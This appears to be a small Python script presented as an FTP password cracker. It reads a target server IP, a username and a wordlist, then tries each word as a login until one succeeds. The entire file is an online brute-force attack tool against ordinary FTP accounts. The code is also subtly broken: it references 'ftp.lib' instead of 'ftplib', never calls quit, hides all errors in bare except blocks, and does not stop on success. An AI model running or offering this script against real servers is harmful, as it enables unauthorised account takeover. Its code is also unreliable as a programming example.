#! /usr/bin/python3

import ftplib

#this is a ftp passwd cracker

server = input('What is the FTP Server IP Address:   ')

user = input('what username do you want to crack? :   ')

PasswordList=input('Path to your Password Lisst:   ')

# create a try block that opens he Password List provided by the user and places each potential password in a variable word

try:

		with open(PasswordList, 'r') as pw:
		
			for word in pw: 
		
				word=word.strip('\r').strip('\n')
		
# creates a try/except block using the ftp module and attempts login with username supplied by the user and the next password on the list
		
				try:
		
					ftp=ftp.lib.FTP(server)
			
					ftp.login(user, word)

# if login is successful, print success
			
					print('Success! The password is ' + word)

# if login fails, go to the except block and print still trying

					ftp.quit
		
				except:
					print('still trying....')
			
# if we come to the end of the password list with success, execute the except block that states there is a wordlist error

except:

	print('Word List error')
